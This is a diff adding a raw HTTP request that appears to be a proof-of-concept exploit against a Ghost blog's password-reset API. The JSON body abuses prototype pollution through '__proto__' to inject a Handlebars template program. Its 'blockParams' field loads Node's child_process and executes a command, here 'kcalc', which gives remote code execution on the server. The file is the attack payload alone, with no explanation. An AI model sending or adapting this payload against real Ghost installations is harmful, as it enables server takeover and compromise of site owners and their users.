@@ -1,0 +1,44 @@
+PUT /ghost/api/v0.1/authentication/passwordreset HTTP/1.1
+Host: localhost:2368
+Content-Length: 1256
+Content-Type: application/json; charset=UTF-8
+Connection: close
+
+{
+    "passwordreset": [{
+        "token": "MHx0ZXN0QHRlc3QuY29tfHRlc3RzZXRlc3Q=",
+        "email": "test1321321@test.com",
+        "newPassword": "kdsflaksldk930209",
+        "ne2Password": "kdsflaksldk930209",
+        "__proto__": {
+            "_template": "../../../current/node_modules/express-hbs/test/issues/23/emptyComment.hbs",
+            "posts": {
+                "type": "browse"
+            },
+            "resource": "constructor",
+            "type": "constructor",
+            "program": {
+                "opcodes": [{
+                    "opcode": "pushLiteral",
+                    "args": ["1"]
+                }, {
+                    "opcode": "appendEscaped",
+                    "args": ["1"]
+                }],
+                "children": [],
+                "blockParams": "global.process.mainModule.constructor._load('child_process').exec('kcalc',function(){})"
+            },
+            "children": [{
+                "opcodes": ["123"],
+                "children": [],
+                "blockParams": 1
+            }],
+            "options": ";",
+            "meta": {
+                "pagination": {
+                    "pages": "100"
+                }
+            }
+        }
+    }]
+}
